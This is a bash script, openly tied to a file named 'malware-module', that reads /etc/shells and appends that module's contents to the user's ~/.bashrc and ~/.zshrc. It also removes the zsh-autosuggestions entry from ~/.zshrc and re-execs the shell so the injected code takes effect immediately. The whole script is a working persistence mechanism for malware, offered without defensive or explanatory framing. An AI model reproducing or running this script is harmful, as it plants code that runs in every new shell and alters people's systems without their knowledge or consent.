#!/bin/bash

MODULE_PATH="./malware-module"

modify_config() {
  local config_file="$1"
  if [[ -f "$config_file" ]]; then
    /bin/cp "$config_file" "$config_file.bak"
    /bin/echo "Backup created: $config_file.bak"
    /bin/cat "$MODULE_PATH" >> "$config_file"
    /bin/echo "Module added to: $config_file"
  else
    /bin/echo "Config file not found: $config_file"
  fi
}

if [[ -f /etc/shells ]]; then
  while read -r shell_path; do
    if [[ -z "$shell_path" || "$shell_path" == \#* ]]; then
      continue
    fi

    shell_name="$(basename "$shell_path")"

    if [[ "$shell_name" == "bash" && "$shell_type" == "" ]]; then
      modify_config "$HOME/.bashrc"
      shell_type="bash"
    elif [[ "$shell_name" == "zsh" && "$shell_type" != "zsh" ]]; then
      modify_config "$HOME/.zshrc"

      if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' -e 's/zsh-autosuggestions//g' ~/.zshrc
      else
        sed -i -e 's/zsh-autosuggestions//g' ~/.zshrc
      fi

      shell_type="zsh"
    fi
  done < /etc/shells

  shell_type="$(basename "$SHELL")"

  if [[ "$shell_type" == "bash" ]]; then
    exec bash
  elif [[ "$shell_type" == "zsh" ]]; then
    exec zsh
  fi
else
  /bin/echo "Error: File not found: /etc/shells. Alas :("
fi
